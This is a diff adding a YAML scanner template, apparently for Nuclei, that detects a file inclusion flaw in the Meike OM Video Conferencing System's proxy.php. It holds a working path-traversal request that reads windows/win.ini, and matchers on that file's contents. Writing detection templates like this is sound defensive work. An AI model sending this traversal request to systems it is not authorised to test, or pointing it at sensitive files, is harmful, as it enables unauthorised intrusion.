@@ -1,0 +1,24 @@
+id: poc-yaml-meike-OM-video-conferencing-system-file-inclusion
+
+info:
+  name: Meike OM Video Conferencing System proxy.php File Inclusion Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: lfi
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/admin/do/proxy.php?method=get&target=../../../../../../../../../../windows/win.ini"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "[files]"
+      - type: word
+        words:
+          - "CMCDLLNAME32="
+      - type: word
+        words:
+          - "[fonts]"
